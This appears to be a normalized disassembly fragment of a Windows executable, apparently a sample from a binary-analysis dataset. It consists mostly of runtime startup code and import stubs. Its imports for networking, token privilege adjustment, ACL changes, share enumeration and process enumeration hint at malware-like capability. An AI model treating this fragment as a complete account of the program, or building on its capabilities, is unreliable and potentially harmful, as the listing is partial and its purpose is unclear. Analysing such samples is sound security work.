mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40addb
cmp [ rw-data ] ebx
jne r-xdata
call sub_40adc6
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40add8
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4010d6
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40112f
mov eax r-xdata
retn
sub_40141a
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call WSAStartup
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_40314a
xor eax eax
push eax
push eax
push eax
push [ esp + 0x14 ]
push eax
push [ esp + 0x18 ]
call [ AdjustTokenPrivileges@IAT ]
retn
WSAStartup
jmp [ WSAStartup@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
sub_4074c0
push ebp
mov ebp esp
mov eax rw-data
pop ebp
retn
sub_4074ca
push ebp
mov ebp esp
mov eax 0x2
sub eax [ ebp + 0x8 ]
mov eax [ eax * 4 + rw-data ]
pop ebp
retn
sub_407507
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
call free
add esp 0x4
pop ebp
retn
sub_407836
push ebp
mov ebp esp
pop ebp
retn
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
strcmp
jmp [ strcmp@IAT ]
memset
jmp [ memset@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
free
jmp [ free@IAT ]
_ftol
jmp [ _ftol@IAT ]
sub_40ada1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
memcpy
jmp [ memcpy@IAT ]
calloc
jmp [ calloc@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40adc6
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40add8
xor eax eax
retn
sub_40addb
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_40adfc
mov eax r--data
jmp __CxxFrameHandler
